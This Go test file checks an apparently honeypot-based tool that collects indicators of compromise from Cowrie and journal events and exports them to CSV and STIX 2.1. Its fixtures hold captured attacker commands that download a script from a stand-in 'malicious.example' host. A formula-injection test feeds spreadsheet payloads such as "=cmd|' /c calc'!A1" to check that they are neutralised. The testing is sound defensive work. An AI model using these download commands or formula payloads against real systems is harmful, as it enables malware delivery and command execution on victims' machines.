package ioc

import (
	"bytes"
	"encoding/json"
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/networkshard/shardlure/pkg/models"
)

func TestCollect(t *testing.T) {
	t0 := time.Date(2025, 1, 1, 12, 0, 0, 0, time.UTC)
	events := []*models.Event{
		{TS: t0, Source: models.SourceCowrie, Kind: models.KindCommand,
			SrcIP: "1.2.3.4", Username: "root", ActorID: "cowrie:abc",
			Command: "curl http://malicious.example/x.sh -o /tmp/x"},
		{TS: t0.Add(time.Minute), Source: models.SourceCowrie, Kind: models.KindCommand,
			SrcIP: "1.2.3.4", Username: "root", ActorID: "cowrie:abc",
			Command: "wget http://malicious.example/x.sh"},
		{TS: t0.Add(2 * time.Minute), Source: models.SourceCowrie, Kind: "file_download",
			SrcIP: "1.2.3.4", ActorID: "cowrie:abc",
			SHA256: "deadbeef"},
		{TS: t0.Add(3 * time.Minute), Source: models.SourceJournal, Kind: models.KindFailedPass,
			SrcIP: "5.6.7.8", Username: "admin", ActorID: "journal:5.6.7.8"},
	}
	got := Collect(events, nil)

	// expectations: 2 IPs, 1 hash, 1 URL (deduped), 2 users
	count := map[Kind]int{}
	for _, ind := range got {
		count[ind.Kind]++
	}
	if count[KindIP] != 2 {
		t.Errorf("KindIP=%d want 2", count[KindIP])
	}
	if count[KindHash] != 1 {
		t.Errorf("KindHash=%d want 1", count[KindHash])
	}
	if count[KindURL] != 1 {
		t.Errorf("KindURL=%d want 1 (deduped)", count[KindURL])
	}
	if count[KindUser] != 2 {
		t.Errorf("KindUser=%d want 2", count[KindUser])
	}

	// the dominant IP should be 1.2.3.4 (3 events) before 5.6.7.8
	var ips []Indicator
	for _, ind := range got {
		if ind.Kind == KindIP {
			ips = append(ips, ind)
		}
	}
	if ips[0].Value != "1.2.3.4" || ips[0].Count != 3 {
		t.Errorf("top IP=%v count=%d want 1.2.3.4/3", ips[0].Value, ips[0].Count)
	}
}

func TestWriteCSV(t *testing.T) {
	t0 := time.Date(2025, 1, 1, 12, 0, 0, 0, time.UTC)
	indicators := []Indicator{
		{Kind: KindIP, Value: "1.2.3.4", FirstSeen: t0, LastSeen: t0, Count: 3,
			Sources: []string{"cowrie"}, Actors: []string{"abc"}, SampleCommand: "uname -a"},
	}
	var buf bytes.Buffer
	if err := WriteCSVWithCoverage(&buf, indicators, Coverage{}); err != nil {
		t.Fatal(err)
	}
	out := buf.String()
	if !strings.Contains(out, "kind,value,first_seen") {
		t.Errorf("missing header: %q", out)
	}
	if !strings.Contains(out, "ip,1.2.3.4") {
		t.Errorf("missing IP row: %q", out)
	}
}

func TestWriteSTIX(t *testing.T) {
	t0 := time.Date(2025, 1, 1, 12, 0, 0, 0, time.UTC)
	indicators := []Indicator{
		{Kind: KindIP, Value: "1.2.3.4", FirstSeen: t0, LastSeen: t0, Count: 3,
			Sources: []string{"cowrie"}, Actors: []string{"abc"}},
		{Kind: KindHash, Value: "deadbeef", FirstSeen: t0, LastSeen: t0, Count: 1},
		{Kind: KindURL, Value: "http://x.example/", FirstSeen: t0, LastSeen: t0, Count: 1},
		{Kind: KindUser, Value: "root", FirstSeen: t0, LastSeen: t0, Count: 5},
	}
	var buf bytes.Buffer
	if err := WriteSTIXWithCoverage(&buf, indicators, Coverage{}); err != nil {
		t.Fatal(err)
	}
	out := buf.String()
	mustHave := []string{
		`"type": "bundle"`,
		`"type": "identity"`,
		`"type": "indicator"`,
		"[ipv4-addr:value = '1.2.3.4']",
		"[file:hashes.'SHA-256' = 'deadbeef']",
		"[url:value = 'http://x.example/']",
		"[user-account:account_login = 'root']",
	}
	for _, want := range mustHave {
		if !strings.Contains(out, want) {
			t.Errorf("STIX missing %q", want)
		}
	}
}

func TestSTIXUsesCorrectIPAddressFamily(t *testing.T) {
	t0 := time.Date(2025, 1, 1, 12, 0, 0, 0, time.UTC)
	cases := []struct {
		name  string
		kind  Kind
		value string
		want  string
	}{
		{name: "IPv4 indicator", kind: KindIP, value: "192.0.2.42", want: "[ipv4-addr:value = '192.0.2.42']"},
		{name: "IPv6 indicator", kind: KindIP, value: "2001:db8::42", want: "[ipv6-addr:value = '2001:db8::42']"},
		{name: "IPv4-mapped IPv6 indicator", kind: KindIP, value: "::ffff:192.0.2.1", want: "[ipv6-addr:value = '::ffff:192.0.2.1']"},
		{name: "IPv4 tunnel", kind: KindTunnel, value: "192.0.2.10:443", want: "[network-traffic:dst_ref.type = 'ipv4-addr' AND network-traffic:dst_ref.value = '192.0.2.10' AND network-traffic:dst_port = 443]"},
		{name: "IPv6 tunnel", kind: KindTunnel, value: "[2001:db8::10]:443", want: "[network-traffic:dst_ref.type = 'ipv6-addr' AND network-traffic:dst_ref.value = '2001:db8::10' AND network-traffic:dst_port = 443]"},
		{name: "IPv4-mapped IPv6 tunnel", kind: KindTunnel, value: "[::ffff:192.0.2.1]:443", want: "[network-traffic:dst_ref.type = 'ipv6-addr' AND network-traffic:dst_ref.value = '::ffff:192.0.2.1' AND network-traffic:dst_port = 443]"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			obj, ok := indicatorToSTIX(Indicator{Kind: tc.kind, Value: tc.value, FirstSeen: t0, LastSeen: t0, Count: 1})
			if !ok {
				t.Fatalf("indicatorToSTIX rejected %s %q", tc.kind, tc.value)
			}
			if obj.Pattern != tc.want {
				t.Fatalf("pattern = %q, want %q", obj.Pattern, tc.want)
			}
		})
	}
}

// TestWriteSTIXSpecShape parses the bundle and asserts STIX 2.1 structural
// compliance rather than substring-matching: the 2.1 Bundle carries ONLY
// type+id (spec_version was removed from the bundle in 2.1 and belongs on
// each object), every object needs a v-prefixed id and spec_version=2.1,
// and indicators need pattern/pattern_type/valid_from.
func TestWriteSTIXSpecShape(t *testing.T) {
	t0 := time.Date(2025, 1, 1, 12, 0, 0, 0, time.UTC)
	indicators := []Indicator{
		{Kind: KindIP, Value: "1.2.3.4", FirstSeen: t0, LastSeen: t0, Count: 3, Sources: []string{"cowrie"}},
		{Kind: KindUser, Value: "root", FirstSeen: t0, LastSeen: t0, Count: 5, Sources: []string{"cowrie"}},
	}
	var buf bytes.Buffer
	if err := WriteSTIXWithCoverage(&buf, indicators, Coverage{}); err != nil {
		t.Fatal(err)
	}

	var bundle struct {
		Type        string           `json:"type"`
		ID          string           `json:"id"`
		SpecVersion *string          `json:"spec_version"` // pointer so we can detect its presence
		Objects     []map[string]any `json:"objects"`
	}
	if err := json.Unmarshal(buf.Bytes(), &bundle); err != nil {
		t.Fatalf("bundle is not valid JSON: %v", err)
	}
	if bundle.Type != "bundle" {
		t.Errorf("bundle type = %q, want bundle", bundle.Type)
	}
	if !strings.HasPrefix(bundle.ID, "bundle--") {
		t.Errorf("bundle id %q missing bundle-- prefix", bundle.ID)
	}
	// The 2.1 Bundle object MUST NOT have spec_version.
	if bundle.SpecVersion != nil {
		t.Errorf("STIX 2.1 bundle must not carry spec_version (got %q)", *bundle.SpecVersion)
	}

	// STIX 2.1 ids are `type--<RFC4122 UUID>`. v4 (random, e.g. the fixed
	// identity) and v5 (name-based, our deterministic indicator ids) are
	// both valid, so accept version nibble 4 or 5.
	idRe := regexp.MustCompile(`^[a-z0-9-]+--[0-9a-f]{8}-[0-9a-f]{4}-[45][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$`)
	sawIndicator := false
	for i, o := range bundle.Objects {
		typ, _ := o["type"].(string)
		id, _ := o["id"].(string)
		if !idRe.MatchString(id) {
			t.Errorf("object %d (%s) has non-v5-UUID id %q", i, typ, id)
		}
		if o["spec_version"] != "2.1" {
			t.Errorf("object %d (%s) spec_version = %v, want 2.1", i, typ, o["spec_version"])
		}
		if typ == "indicator" {
			sawIndicator = true
			for _, req := range []string{"pattern", "pattern_type", "valid_from", "created", "modified"} {
				if _, ok := o[req]; !ok {
					t.Errorf("indicator %q missing required property %q", id, req)
				}
			}
			if o["pattern_type"] != "stix" {
				t.Errorf("indicator pattern_type = %v, want stix", o["pattern_type"])
			}
		}
	}
	if !sawIndicator {
		t.Error("bundle contained no indicator objects")
	}
}

// TestWriteSTIXDeterministic confirms two successive exports of the
// same indicator set produce byte-identical JSON. Regression guard
// for Fix #9 (replacing time.Now() in WriteSTIX with stable
// indicator-derived timestamps).
func TestWriteSTIXDeterministic(t *testing.T) {
	t0 := time.Date(2025, 1, 1, 12, 0, 0, 0, time.UTC)
	indicators := []Indicator{
		{Kind: KindIP, Value: "1.2.3.4", FirstSeen: t0, LastSeen: t0.Add(time.Hour), Count: 3, Sources: []string{"cowrie"}},
		{Kind: KindUser, Value: "root", FirstSeen: t0, LastSeen: t0.Add(2 * time.Hour), Count: 5, Sources: []string{"cowrie"}},
	}
	var a, b bytes.Buffer
	if err := WriteSTIXWithCoverage(&a, indicators, Coverage{}); err != nil {
		t.Fatalf("first export: %v", err)
	}
	// Sleep across at least one second to prove we're not implicitly
	// hashing the wall clock.
	time.Sleep(1100 * time.Millisecond)
	if err := WriteSTIXWithCoverage(&b, indicators, Coverage{}); err != nil {
		t.Fatalf("second export: %v", err)
	}
	if !bytes.Equal(a.Bytes(), b.Bytes()) {
		t.Errorf("STIX export not deterministic:\n--- A ---\n%s\n--- B ---\n%s", a.String(), b.String())
	}
}

// TestWriteCSVNeutralizesFormulaInjection locks in the CWE-1236 fix: a captured
// username/command beginning with =,+,-,@ (attacker-controlled) must not be
// emitted as a live spreadsheet formula.
func TestWriteCSVNeutralizesFormulaInjection(t *testing.T) {
	now := time.Now()
	inds := []Indicator{
		{Kind: "user", Value: "=cmd|' /c calc'!A1", FirstSeen: now, LastSeen: now, Count: 1},
		{Kind: "user", Value: "+1+1", FirstSeen: now, LastSeen: now, Count: 1},
		{Kind: "ip", Value: "1.2.3.4", FirstSeen: now, LastSeen: now, Count: 1, SampleCommand: "@SUM(1+9)*cmd"},
		{Kind: "ip", Value: "5.6.7.8", FirstSeen: now, LastSeen: now, Count: 1, SampleCommand: "uname -a"},
	}
	var buf bytes.Buffer
	if err := WriteCSVWithCoverage(&buf, inds, Coverage{}); err != nil {
		t.Fatalf("WriteCSV: %v", err)
	}
	out := buf.String()
	for _, danger := range []string{"=cmd", "+1+1", "@SUM"} {
		// The dangerous lead must be apostrophe-prefixed, never bare at a cell start.
		if strings.Contains(out, ",'"+danger) || strings.Contains(out, "'"+danger) {
			continue
		}
		t.Errorf("formula lead %q not neutralized in CSV:\n%s", danger, out)
	}
	// A benign value/command must pass through unchanged.
	if !strings.Contains(out, "1.2.3.4") || !strings.Contains(out, "uname -a") {
		t.Errorf("benign fields altered:\n%s", out)
	}
	// Sanity: csvSafe leaves normal text alone, prefixes dangerous leads.
	if csvSafe("root") != "root" || csvSafe("=evil") != "'=evil" {
		t.Errorf("csvSafe wrong: %q %q", csvSafe("root"), csvSafe("=evil"))
	}
}

// TestCoverageNoteOnlyWhenSampled pins the predicate. A note on a COMPLETE
// export would be a false claim of incompleteness, and it would also break the
// byte-stability contract for every ordinary export.
func TestCoverageNoteOnlyWhenSampled(t *testing.T) {
	for _, c := range []struct {
		name string
		cov  Coverage
		want bool
	}{
		{"zero value", Coverage{}, false},
		{"complete window", Coverage{Analyzed: 500, Total: 500, WindowHours: 24}, false},
		{"analyzed exceeds total", Coverage{Analyzed: 600, Total: 500}, false},
		{"total unknown", Coverage{Analyzed: 500, Total: 0}, false},
		{"sampled", Coverage{Analyzed: 200000, Total: 533697, WindowHours: 720}, true},
	} {
		if got := c.cov.Sampled(); got != c.want {
			t.Errorf("%s: Sampled()=%v want %v", c.name, got, c.want)
		}
		if note := c.cov.Note(); (note != "") != c.want {
			t.Errorf("%s: Note()=%q, want empty=%v", c.name, note, !c.want)
		}
	}
	// The note must carry both numbers and the window, or it does not tell the
	// analyst how much of the picture is missing.
	note := Coverage{Analyzed: 200000, Total: 533697, WindowHours: 720}.Note()
	for _, want := range []string{"200000", "533697", "37.5%", "720h", "SAMPLED"} {
		if !strings.Contains(note, want) {
			t.Errorf("note missing %q: %s", want, note)
		}
	}
}

// TestCompleteExportsStayByteIdentical is the regression guard for adding the
// disclosure at all. WriteCSV/WriteSTIX are documented as stable-schema and
// byte-stable; the coverage variants must be a no-op when nothing was sampled,
// or every existing consumer and the STIX dedupe contract break.
func TestCompleteExportsStayByteIdentical(t *testing.T) {
	t0 := time.Date(2025, 1, 1, 12, 0, 0, 0, time.UTC)
	inds := []Indicator{
		{Kind: KindIP, Value: "1.2.3.4", FirstSeen: t0, LastSeen: t0.Add(time.Hour), Count: 3, Sources: []string{"cowrie"}},
		{Kind: KindUser, Value: "root", FirstSeen: t0, LastSeen: t0.Add(2 * time.Hour), Count: 5, Sources: []string{"cowrie"}},
	}
	complete := Coverage{Analyzed: 2, Total: 2, WindowHours: 24}
	for _, c := range []struct {
		name string
		cov  Coverage
	}{{"zero", Coverage{}}, {"complete", complete}} {
		var plain, withCov bytes.Buffer
		if err := WriteCSVWithCoverage(&plain, inds, Coverage{}); err != nil {
			t.Fatalf("WriteCSV: %v", err)
		}
		if err := WriteCSVWithCoverage(&withCov, inds, c.cov); err != nil {
			t.Fatalf("WriteCSVWithCoverage: %v", err)
		}
		if !bytes.Equal(plain.Bytes(), withCov.Bytes()) {
			t.Errorf("CSV %s coverage changed the bytes:\n--- plain ---\n%s\n--- cov ---\n%s",
				c.name, plain.String(), withCov.String())
		}
		plain.Reset()
		withCov.Reset()
		if err := WriteSTIXWithCoverage(&plain, inds, Coverage{}); err != nil {
			t.Fatalf("WriteSTIX: %v", err)
		}
		if err := WriteSTIXWithCoverage(&withCov, inds, c.cov); err != nil {
			t.Fatalf("WriteSTIXWithCoverage: %v", err)
		}
		if !bytes.Equal(plain.Bytes(), withCov.Bytes()) {
			t.Errorf("STIX %s coverage changed the bytes", c.name)
		}
	}
}

// TestSampledCSVCarriesDisclosure pins the actual fix for the download path: the
// advisory HTTP header is gone once the browser writes the file, so the note has
// to be IN the file. It must also be a comment line, not a data row - the column
// schema is documented as stable and consumers parse by index.
func TestSampledCSVCarriesDisclosure(t *testing.T) {
	t0 := time.Date(2025, 1, 1, 12, 0, 0, 0, time.UTC)
	inds := []Indicator{
		{Kind: KindIP, Value: "1.2.3.4", FirstSeen: t0, LastSeen: t0, Count: 3, Sources: []string{"cowrie"}},
	}
	var buf bytes.Buffer
	cov := Coverage{Analyzed: 200000, Total: 533697, WindowHours: 720}
	if err := WriteCSVWithCoverage(&buf, inds, cov); err != nil {
		t.Fatalf("WriteCSVWithCoverage: %v", err)
	}
	lines := strings.Split(strings.TrimRight(buf.String(), "\n"), "\n")
	if len(lines) != 3 {
		t.Fatalf("want comment+header+1 row, got %d lines:\n%s", len(lines), buf.String())
	}
	if !strings.HasPrefix(lines[0], "# ") {
		t.Errorf("disclosure is not a comment line: %q", lines[0])
	}
	if !strings.Contains(lines[0], "200000") || !strings.Contains(lines[0], "533697") {
		t.Errorf("comment does not state the coverage: %q", lines[0])
	}
	// The schema must be untouched: header still line 2, still 8 columns.
	if lines[1] != "kind,value,first_seen,last_seen,count,sources,actors,sample_command" {
		t.Errorf("header row changed: %q", lines[1])
	}
	if !strings.HasPrefix(lines[2], "ip,1.2.3.4,") {
		t.Errorf("data row not where a parser expects it: %q", lines[2])
	}
}

// TestSampledSTIXCarriesDisclosureAndStaysDeterministic is the sharpest edge of
// the whole change. The note has to reach a TIP, but STIX byte-stability is a
// contract (downstream dedupe hashes SDO content), so the note must be a pure
// function of the coverage numbers - never a wall-clock reading.
func TestSampledSTIXCarriesDisclosureAndStaysDeterministic(t *testing.T) {
	t0 := time.Date(2025, 1, 1, 12, 0, 0, 0, time.UTC)
	inds := []Indicator{
		{Kind: KindIP, Value: "1.2.3.4", FirstSeen: t0, LastSeen: t0.Add(time.Hour), Count: 3, Sources: []string{"cowrie"}},
	}
	cov := Coverage{Analyzed: 200000, Total: 533697, WindowHours: 720}

	var a, b bytes.Buffer
	if err := WriteSTIXWithCoverage(&a, inds, cov); err != nil {
		t.Fatalf("first export: %v", err)
	}
	time.Sleep(1100 * time.Millisecond) // cross a second boundary, as the sibling test does
	if err := WriteSTIXWithCoverage(&b, inds, cov); err != nil {
		t.Fatalf("second export: %v", err)
	}
	if !bytes.Equal(a.Bytes(), b.Bytes()) {
		t.Errorf("sampled STIX export is not byte-stable; downstream dedupe would break")
	}

	var bundle struct {
		Objects []struct {
			Type        string `json:"type"`
			ID          string `json:"id"`
			Description string `json:"description"`
		} `json:"objects"`
	}
	if err := json.Unmarshal(a.Bytes(), &bundle); err != nil {
		t.Fatalf("bundle is not valid JSON: %v", err)
	}
	var identity int
	for _, o := range bundle.Objects {
		if o.Type != "identity" {
			continue
		}
		identity++
		if !strings.Contains(o.Description, "SAMPLED") || !strings.Contains(o.Description, "533697") {
			t.Errorf("identity description carries no coverage note: %q", o.Description)
		}
		// The ID must NOT be re-derived from the description: indicator
		// objects point at it via created_by_ref.
		if o.ID != stixIdentity {
			t.Errorf("identity ID changed to %q; created_by_ref references would dangle", o.ID)
		}
	}
	if identity != 1 {
		t.Fatalf("want exactly 1 identity SDO, got %d", identity)
	}
}
